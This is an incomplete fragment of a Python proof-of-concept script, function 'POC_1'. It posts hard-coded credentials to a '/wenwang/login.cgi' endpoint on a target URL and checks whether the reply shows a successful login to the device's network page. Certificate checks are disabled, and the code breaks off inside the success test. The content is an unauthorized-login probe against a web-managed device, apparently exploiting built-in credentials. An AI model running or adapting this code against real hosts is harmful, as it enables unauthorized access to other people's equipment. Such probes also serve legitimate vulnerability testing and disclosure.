...
def POC_1(target_url):
    url = target_url + "/wenwang/login.cgi"
    headers = {
    ...
    data = "user=NaRdDZfmHsyuyq&password=KAd4sc4Wracbogp&ww_loginpage=1&csrfprotect=&Submit=%E7%99%BB%E5%BD%95"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5)
        if "/wenwang/ww_network.htm?lgn=1" in r.text and r.status_code == 200:
